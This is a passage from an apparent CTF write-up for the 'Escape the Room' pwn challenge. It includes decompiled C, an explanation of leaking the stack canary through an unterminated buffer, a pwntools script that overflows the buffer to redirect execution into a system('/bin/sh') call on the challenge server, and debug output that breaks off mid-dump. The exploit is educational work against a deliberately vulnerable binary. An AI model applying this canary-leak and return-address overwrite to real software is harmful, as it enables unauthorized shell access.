</span></code></pre></div> <p>flag: <code>flag{fru17s_w3r3nt_r4nd0m_4t_a11}</code></p> <hr> <h2 id=escape-the-room>Escape the Room<a class=headerlink href=#escape-the-room title="Permanent link">&para;</a></h2> <p>We were given a <a href=beginner/escape_the_room/chal>binary</a>. It asks for a key and also lets us try for a second chance.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-21-1><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a>backdoor/beginner/escape_the_room<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span><span class=w> </span>via<span class=w> </span>🐍<span class=w> </span>v3.11.6
</span><span id=__span-21-2><a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>❯<span class=w> </span>./chal
</span><span id=__span-21-3><a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a>Welcome<span class=w> </span>to<span class=w> </span>Escape<span class=w> </span>the<span class=w> </span>R00m<span class=w> </span>!
</span><span id=__span-21-4><a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a>You<span class=w> </span>have<span class=w> </span>only<span class=w> </span>two<span class=w> </span>chances<span class=w> </span>to<span class=w> </span>escape<span class=w> </span>the<span class=w> </span>room<span class=w> </span>...
</span><span id=__span-21-5><a id=__codelineno-21-5 name=__codelineno-21-5 href=#__codelineno-21-5></a>Enter<span class=w> </span>key<span class=w> </span>:<span class=w> </span>key
</span><span id=__span-21-6><a id=__codelineno-21-6 name=__codelineno-21-6 href=#__codelineno-21-6></a>key
</span><span id=__span-21-7><a id=__codelineno-21-7 name=__codelineno-21-7 href=#__codelineno-21-7></a><span class=w> </span>is<span class=w> </span>not<span class=w> </span>the<span class=w> </span>key,<span class=w> </span>try<span class=w> </span>again<span class=w> </span>!
</span><span id=__span-21-8><a id=__codelineno-21-8 name=__codelineno-21-8 href=#__codelineno-21-8></a>Enter<span class=w> </span>key<span class=w> </span>:<span class=w> </span>key
</span><span id=__span-21-9><a id=__codelineno-21-9 name=__codelineno-21-9 href=#__codelineno-21-9></a>Wrong,<span class=w> </span>go<span class=w> </span>away<span class=w> </span>!
</span></code></pre></div> <p>The first input is a little suspicious. We can see that our input is being reflected. Maybe there is a format string vulnerability in the binary? Let's load it in ghidra.</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-22-1><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=kt>void</span><span class=w> </span><span class=nf>escape</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-22-2><a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a>
</span><span id=__span-22-3><a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a><span class=p>{</span>
</span><span id=__span-22-4><a id=__codelineno-22-4 name=__codelineno-22-4 href=#__codelineno-22-4></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Sweet !&quot;</span><span class=p>);</span>
</span><span id=__span-22-5><a id=__codelineno-22-5 name=__codelineno-22-5 href=#__codelineno-22-5></a><span class=w>  </span><span class=n>system</span><span class=p>(</span><span class=s>&quot;/bin/sh&quot;</span><span class=p>);</span>
</span><span id=__span-22-6><a id=__codelineno-22-6 name=__codelineno-22-6 href=#__codelineno-22-6></a><span class=w>  </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-22-7><a id=__codelineno-22-7 name=__codelineno-22-7 href=#__codelineno-22-7></a><span class=p>}</span>
</span><span id=__span-22-8><a id=__codelineno-22-8 name=__codelineno-22-8 href=#__codelineno-22-8></a>
</span><span id=__span-22-9><a id=__codelineno-22-9 name=__codelineno-22-9 href=#__codelineno-22-9></a>
</span><span id=__span-22-10><a id=__codelineno-22-10 name=__codelineno-22-10 href=#__codelineno-22-10></a><span class=n>undefined8</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-22-11><a id=__codelineno-22-11 name=__codelineno-22-11 href=#__codelineno-22-11></a>
</span><span id=__span-22-12><a id=__codelineno-22-12 name=__codelineno-22-12 href=#__codelineno-22-12></a><span class=p>{</span>
</span><span id=__span-22-13><a id=__codelineno-22-13 name=__codelineno-22-13 href=#__codelineno-22-13></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>iVar1</span><span class=p>;</span>
</span><span id=__span-22-14><a id=__codelineno-22-14 name=__codelineno-22-14 href=#__codelineno-22-14></a><span class=w>  </span><span class=kt>time_t</span><span class=w> </span><span class=n>tVar2</span><span class=p>;</span>
</span><span id=__span-22-15><a id=__codelineno-22-15 name=__codelineno-22-15 href=#__codelineno-22-15></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span><span id=__span-22-16><a id=__codelineno-22-16 name=__codelineno-22-16 href=#__codelineno-22-16></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>inp</span><span class=w> </span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span><span id=__span-22-17><a id=__codelineno-22-17 name=__codelineno-22-17 href=#__codelineno-22-17></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>rstr</span><span class=w> </span><span class=p>[</span><span class=mi>40</span><span class=p>];</span>
</span><span id=__span-22-18><a id=__codelineno-22-18 name=__codelineno-22-18 href=#__codelineno-22-18></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>canary</span><span class=p>;</span>
</span><span id=__span-22-19><a id=__codelineno-22-19 name=__codelineno-22-19 href=#__codelineno-22-19></a>
</span><span id=__span-22-20><a id=__codelineno-22-20 name=__codelineno-22-20 href=#__codelineno-22-20></a><span class=w>  </span><span class=n>canary</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>);</span>
</span><span id=__span-22-21><a id=__codelineno-22-21 name=__codelineno-22-21 href=#__codelineno-22-21></a><span class=w>  </span><span class=n>tVar2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>time</span><span class=p>(</span><span class=mh>0x0</span><span class=p>);</span>
</span><span id=__span-22-22><a id=__codelineno-22-22 name=__codelineno-22-22 href=#__codelineno-22-22></a><span class=w>  </span><span class=n>srand</span><span class=p>(</span><span class=n>tVar2</span><span class=p>);</span>
</span><span id=__span-22-23><a id=__codelineno-22-23 name=__codelineno-22-23 href=#__codelineno-22-23></a><span class=w>  </span><span class=n>rand_str</span><span class=p>(</span><span class=n>rstr</span><span class=p>,</span><span class=mi>30</span><span class=p>);</span>
</span><span id=__span-22-24><a id=__codelineno-22-24 name=__codelineno-22-24 href=#__codelineno-22-24></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Welcome to Escape the R00m !&quot;</span><span class=p>);</span>
</span><span id=__span-22-25><a id=__codelineno-22-25 name=__codelineno-22-25 href=#__codelineno-22-25></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;You have only two chances to escape the room ...&quot;</span><span class=p>);</span>
</span><span id=__span-22-26><a id=__codelineno-22-26 name=__codelineno-22-26 href=#__codelineno-22-26></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Enter key : &quot;</span><span class=p>);</span>
</span><span id=__span-22-27><a id=__codelineno-22-27 name=__codelineno-22-27 href=#__codelineno-22-27></a><span class=w>  </span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>inp</span><span class=p>,</span><span class=mi>80</span><span class=p>);</span>
</span><span id=__span-22-28><a id=__codelineno-22-28 name=__codelineno-22-28 href=#__codelineno-22-28></a><span class=w>  </span><span class=n>iVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strncmp</span><span class=p>(</span><span class=n>rstr</span><span class=p>,</span><span class=n>inp</span><span class=p>,</span><span class=mi>30</span><span class=p>);</span>
</span><span id=__span-22-29><a id=__codelineno-22-29 name=__codelineno-22-29 href=#__codelineno-22-29></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>iVar1</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-22-30><a id=__codelineno-22-30 name=__codelineno-22-30 href=#__codelineno-22-30></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;That was a nice escape ... But there is more to it !&quot;</span><span class=p>);</span>
</span><span id=__span-22-31><a id=__codelineno-22-31 name=__codelineno-22-31 href=#__codelineno-22-31></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-22-32><a id=__codelineno-22-32 name=__codelineno-22-32 href=#__codelineno-22-32></a><span class=w>  </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-22-33><a id=__codelineno-22-33 name=__codelineno-22-33 href=#__codelineno-22-33></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;%s is not the key, try again !</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>inp</span><span class=p>);</span>
</span><span id=__span-22-34><a id=__codelineno-22-34 name=__codelineno-22-34 href=#__codelineno-22-34></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-22-35><a id=__codelineno-22-35 name=__codelineno-22-35 href=#__codelineno-22-35></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Enter key : &quot;</span><span class=p>);</span>
</span><span id=__span-22-36><a id=__codelineno-22-36 name=__codelineno-22-36 href=#__codelineno-22-36></a><span class=w>  </span><span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&quot;%s&quot;</span><span class=p>,</span><span class=n>inp</span><span class=p>);</span>
</span><span id=__span-22-37><a id=__codelineno-22-37 name=__codelineno-22-37 href=#__codelineno-22-37></a><span class=w>  </span><span class=n>iVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strncmp</span><span class=p>(</span><span class=n>rstr</span><span class=p>,</span><span class=n>inp</span><span class=p>,</span><span class=mh>0x1e</span><span class=p>);</span>
</span><span id=__span-22-38><a id=__codelineno-22-38 name=__codelineno-22-38 href=#__codelineno-22-38></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>iVar1</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-22-39><a id=__codelineno-22-39 name=__codelineno-22-39 href=#__codelineno-22-39></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;That was a nice escape ... But there is more to it !&quot;</span><span class=p>);</span>
</span><span id=__span-22-40><a id=__codelineno-22-40 name=__codelineno-22-40 href=#__codelineno-22-40></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-22-41><a id=__codelineno-22-41 name=__codelineno-22-41 href=#__codelineno-22-41></a><span class=w>  </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-22-42><a id=__codelineno-22-42 name=__codelineno-22-42 href=#__codelineno-22-42></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Wrong, go away !&quot;</span><span class=p>);</span>
</span><span id=__span-22-43><a id=__codelineno-22-43 name=__codelineno-22-43 href=#__codelineno-22-43></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-22-44><a id=__codelineno-22-44 name=__codelineno-22-44 href=#__codelineno-22-44></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>canary</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-22-45><a id=__codelineno-22-45 name=__codelineno-22-45 href=#__codelineno-22-45></a><span class=w>                    </span><span class=cm>/* WARNING: Subroutine does not return */</span>
</span><span id=__span-22-46><a id=__codelineno-22-46 name=__codelineno-22-46 href=#__codelineno-22-46></a><span class=w>    </span><span class=n>__stack_chk_fail</span><span class=p>();</span>
</span><span id=__span-22-47><a id=__codelineno-22-47 name=__codelineno-22-47 href=#__codelineno-22-47></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-22-48><a id=__codelineno-22-48 name=__codelineno-22-48 href=#__codelineno-22-48></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-22-49><a id=__codelineno-22-49 name=__codelineno-22-49 href=#__codelineno-22-49></a><span class=p>}</span>
</span></code></pre></div> <p>As we can see from this code, even if we do generate the correct key using the strategy from the fruit_basket challenge to hack the seed, not only it does not give us shell nor does it leak any data. We can see that the buffer being read in the first try is 80. So, we can overflow our input buffer and overwrite our randomly generated string to be the same as our input. But making our guess right with an overflow does not help us either. Instead, if we make a wrong guess, we are given our input. We can see that the input is not being null terminated after being read. So, we can leak the canary by writing our buffer all the way up to our canary but also make the two strings that will be compared not equal. Because we want that leak. Then we will use the second input to overflow and write to the return address the address of our escape function.</p> <p>Here is the python script for the solution:</p> <div class="language-py highlight"><pre><span></span><code><span id=__span-23-1><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=ch>#!/usr/bin/env python</span>
</span><span id=__span-23-2><a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a>
</span><span id=__span-23-3><a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>ELF</span><span class=p>,</span> <span class=n>ROP</span><span class=p>,</span> <span class=n>context</span><span class=p>,</span> <span class=n>log</span><span class=p>,</span> <span class=n>p64</span><span class=p>,</span> <span class=n>process</span><span class=p>,</span> <span class=n>remote</span>
</span><span id=__span-23-4><a id=__codelineno-23-4 name=__codelineno-23-4 href=#__codelineno-23-4></a>
</span><span id=__span-23-5><a id=__codelineno-23-5 name=__codelineno-23-5 href=#__codelineno-23-5></a><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&quot;debug&quot;</span>
</span><span id=__span-23-6><a id=__codelineno-23-6 name=__codelineno-23-6 href=#__codelineno-23-6></a><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;split-window&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
</span><span id=__span-23-7><a id=__codelineno-23-7 name=__codelineno-23-7 href=#__codelineno-23-7></a>
</span><span id=__span-23-8><a id=__codelineno-23-8 name=__codelineno-23-8 href=#__codelineno-23-8></a><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./chal&quot;</span><span class=p>)</span>
</span><span id=__span-23-9><a id=__codelineno-23-9 name=__codelineno-23-9 href=#__codelineno-23-9></a>
</span><span id=__span-23-10><a id=__codelineno-23-10 name=__codelineno-23-10 href=#__codelineno-23-10></a><span class=c1># p = process(elf.path)</span>
</span><span id=__span-23-11><a id=__codelineno-23-11 name=__codelineno-23-11 href=#__codelineno-23-11></a><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&quot;34.70.212.151&quot;</span><span class=p>,</span> <span class=mi>8005</span><span class=p>)</span>
</span><span id=__span-23-12><a id=__codelineno-23-12 name=__codelineno-23-12 href=#__codelineno-23-12></a>
</span><span id=__span-23-13><a id=__codelineno-23-13 name=__codelineno-23-13 href=#__codelineno-23-13></a><span class=n>r</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span><span id=__span-23-14><a id=__codelineno-23-14 name=__codelineno-23-14 href=#__codelineno-23-14></a>
</span><span id=__span-23-15><a id=__codelineno-23-15 name=__codelineno-23-15 href=#__codelineno-23-15></a><span class=n>ret</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&quot;ret&quot;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span><span id=__span-23-16><a id=__codelineno-23-16 name=__codelineno-23-16 href=#__codelineno-23-16></a><span class=n>escape</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&quot;escape&quot;</span><span class=p>]</span>
</span><span id=__span-23-17><a id=__codelineno-23-17 name=__codelineno-23-17 href=#__codelineno-23-17></a>
</span><span id=__span-23-18><a id=__codelineno-23-18 name=__codelineno-23-18 href=#__codelineno-23-18></a><span class=c1># gdb.attach(</span>
</span><span id=__span-23-19><a id=__codelineno-23-19 name=__codelineno-23-19 href=#__codelineno-23-19></a><span class=c1>#     p,</span>
</span><span id=__span-23-20><a id=__codelineno-23-20 name=__codelineno-23-20 href=#__codelineno-23-20></a><span class=c1>#     &quot;&quot;&quot;</span>
</span><span id=__span-23-21><a id=__codelineno-23-21 name=__codelineno-23-21 href=#__codelineno-23-21></a><span class=c1>#     set follow-fork-mode child</span>
</span><span id=__span-23-22><a id=__codelineno-23-22 name=__codelineno-23-22 href=#__codelineno-23-22></a><span class=c1>#     break 0x00401564</span>
</span><span id=__span-23-23><a id=__codelineno-23-23 name=__codelineno-23-23 href=#__codelineno-23-23></a><span class=c1>#     continue</span>
</span><span id=__span-23-24><a id=__codelineno-23-24 name=__codelineno-23-24 href=#__codelineno-23-24></a><span class=c1>#     &quot;&quot;&quot;,</span>
</span><span id=__span-23-25><a id=__codelineno-23-25 name=__codelineno-23-25 href=#__codelineno-23-25></a><span class=c1># )</span>
</span><span id=__span-23-26><a id=__codelineno-23-26 name=__codelineno-23-26 href=#__codelineno-23-26></a>
</span><span id=__span-23-27><a id=__codelineno-23-27 name=__codelineno-23-27 href=#__codelineno-23-27></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;A&quot;</span> <span class=o>*</span> <span class=mi>32</span>
</span><span id=__span-23-28><a id=__codelineno-23-28 name=__codelineno-23-28 href=#__codelineno-23-28></a><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&quot;B&quot;</span> <span class=o>*</span> <span class=mi>40</span>
</span><span id=__span-23-29><a id=__codelineno-23-29 name=__codelineno-23-29 href=#__codelineno-23-29></a>
</span><span id=__span-23-30><a id=__codelineno-23-30 name=__codelineno-23-30 href=#__codelineno-23-30></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;Enter key : &quot;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-23-31><a id=__codelineno-23-31 name=__codelineno-23-31 href=#__codelineno-23-31></a><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span><span id=__span-23-32><a id=__codelineno-23-32 name=__codelineno-23-32 href=#__codelineno-23-32></a><span class=n>canary</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span> <span class=o>+</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[:</span><span class=mi>7</span><span class=p>]</span>
</span><span id=__span-23-33><a id=__codelineno-23-33 name=__codelineno-23-33 href=#__codelineno-23-33></a><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;canary: </span><span class=si>{</span><span class=n>canary</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
</span><span id=__span-23-34><a id=__codelineno-23-34 name=__codelineno-23-34 href=#__codelineno-23-34></a><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>canary</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00401596</span><span class=p>)</span>
</span><span id=__span-23-35><a id=__codelineno-23-35 name=__codelineno-23-35 href=#__codelineno-23-35></a>
</span><span id=__span-23-36><a id=__codelineno-23-36 name=__codelineno-23-36 href=#__codelineno-23-36></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;Enter key : &quot;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-23-37><a id=__codelineno-23-37 name=__codelineno-23-37 href=#__codelineno-23-37></a><span class=c1># p.recv()</span>
</span><span id=__span-23-38><a id=__codelineno-23-38 name=__codelineno-23-38 href=#__codelineno-23-38></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></code></pre></div> <blockquote> <p>Note: I could not get the script to work if we wanted to return to escape function. But I ended up returning to just before the shell is being called with system function inside the escape function. Also note that I could do it because PIE was disabled and I could jump to any address directly.</p> </blockquote> <div class="language-sh highlight"><pre><span></span><code><span id=__span-24-1><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a>backdoor/beginner/escape_the_room<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span><span class=w> </span>via<span class=w> </span>🐍<span class=w> </span>v3.11.6
</span><span id=__span-24-2><a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a>❯<span class=w> </span>./sol.py
</span><span id=__span-24-3><a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal&#39;</span>
</span><span id=__span-24-4><a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a><span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
</span><span id=__span-24-5><a id=__codelineno-24-5 name=__codelineno-24-5 href=#__codelineno-24-5></a><span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
</span><span id=__span-24-6><a id=__codelineno-24-6 name=__codelineno-24-6 href=#__codelineno-24-6></a><span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
</span><span id=__span-24-7><a id=__codelineno-24-7 name=__codelineno-24-7 href=#__codelineno-24-7></a><span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
</span><span id=__span-24-8><a id=__codelineno-24-8 name=__codelineno-24-8 href=#__codelineno-24-8></a><span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
</span><span id=__span-24-9><a id=__codelineno-24-9 name=__codelineno-24-9 href=#__codelineno-24-9></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal&#39;</span><span class=w> </span><span class=nv>argv</span><span class=o>=[</span>b<span class=s1>&#39;/home/groot/dev/gr007-40.github.io/docs/writeups/2023/backdoor/beginner/escape_the_room/chal&#39;</span><span class=o>]</span><span class=w> </span>:<span class=w> </span>pid<span class=w> </span><span class=m>142126</span>
</span><span id=__span-24-10><a id=__codelineno-24-10 name=__codelineno-24-10 href=#__codelineno-24-10></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>5</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./chal&#39;</span>
</span><span id=__span-24-11><a id=__codelineno-24-11 name=__codelineno-24-11 href=#__codelineno-24-11></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x5a<span class=w> </span>bytes:
</span><span id=__span-24-12><a id=__codelineno-24-12 name=__codelineno-24-12 href=#__codelineno-24-12></a><span class=w>    </span>b<span class=s1>&#39;Welcome to Escape the R00m !\n&#39;</span>
</span><span id=__span-24-13><a id=__codelineno-24-13 name=__codelineno-24-13 href=#__codelineno-24-13></a><span class=w>    </span>b<span class=s1>&#39;You have only two chances to escape the room ...\n&#39;</span>
</span><span id=__span-24-14><a id=__codelineno-24-14 name=__codelineno-24-14 href=#__codelineno-24-14></a><span class=w>    </span>b<span class=s1>&#39;Enter key : &#39;</span>
</span><span id=__span-24-15><a id=__codelineno-24-15 name=__codelineno-24-15 href=#__codelineno-24-15></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x49<span class=w> </span>bytes:
</span><span id=__span-24-16><a id=__codelineno-24-16 name=__codelineno-24-16 href=#__codelineno-24-16></a><span class=w>    </span>b<span class=s1>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n&#39;</span>
</span><span id=__span-24-17><a id=__codelineno-24-17 name=__codelineno-24-17 href=#__codelineno-24-17></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x7a<span class=w> </span>bytes:
</span><span id=__span-24-18><a id=__codelineno-24-18 name=__codelineno-24-18 href=#__codelineno-24-18></a><span class=w>    </span><span class=m>00000000</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span>│AAAA│AAAA│AAAA│AAAA│
</span><span id=__span-24-19><a id=__codelineno-24-19 name=__codelineno-24-19 href=#__codelineno-24-19></a><span class=w>    </span>*
</span><span id=__span-24-20><a id=__codelineno-24-20 name=__codelineno-24-20 href=#__codelineno-24-20></a><span class=w>    </span><span class=m>00000020</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span>│BBBB│BBBB│BBBB│BBBB│
</span><span id=__span-24-21><a id=__codelineno-24-21 name=__codelineno-24-21 href=#__codelineno-24-21></a><span class=w>    </span>*
</span><span id=__span-24-22><a id=__codelineno-24-22 name=__codelineno-24-22 href=#__codelineno-24-22></a><span class=w>    </span><span class=m>00000040</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span>0a<span class=w> </span><span class=m>36</span><span class=w> </span>4e<span class=w> </span>c6<span class=w>  </span>3d<span class=w> </span><span class=m>16</span><span class=w> </span>d2<span class=w> </span><span class=m>43</span><span class=w>  </span>│BBBB│BBBB│·6N·│<span class=o>=</span>··C│
</span><span id=__span-24-23><a id=__codelineno-24-23 name=__codelineno-24-23 href=#__codelineno-24-23></a><span class=w>    </span><span class=m>00000050</span><span class=w>  </span><span class=m>01</span><span class=w> </span><span class=m>20</span><span class=w> </span><span class=m>69</span><span class=w> </span><span class=m>73</span><span class=w>  </span><span class=m>20</span><span class=w> </span>6e<span class=w> </span>6f<span class=w> </span><span class=m>74</span><span class=w>  </span><span class=m>20</span><span class=w> </span><span class=m>74</span><span class=w> </span><span class=m>68</span><span class=w> </span><span class=m>65</span><span class=w>  </span><span class=m>20</span><span class=w> </span>6b<span class=w> </span><span class=m>65</span><span class=w> </span><span class=m>79</span><span class=w>  </span>│·<span class=w> </span>is│<span class=w> </span>not│<span class=w> </span>the│<span class=w> </span>key│
</span><span id=__span-24-24><a id=__codelineno-24-24 name=__codelineno-24-24 href=#__codelineno-24-24></a><span class=w>    </span><span class=m>00000060</span><span class=w>  </span>2c<span class=w> </span><span class=m>20</span><span class=w> </span><span class=m>74</span><span class=w> </span><span class=m>72</span><span class=w>  </span><span class=m>79</span><span class=w> </span><span class=m>20</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>67</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>69</span><span class=w> </span>6e<span class=w> </span><span class=m>20</span><span class=w>  </span><span class=m>21</span><span class=w> </span>0a<span class=w> </span><span class=m>45</span><span class=w> </span>6e<span class=w>  </span>│,<span class=w> </span>tr│y<span class=w> </span>ag│ain<span class=w> </span>│!·En│
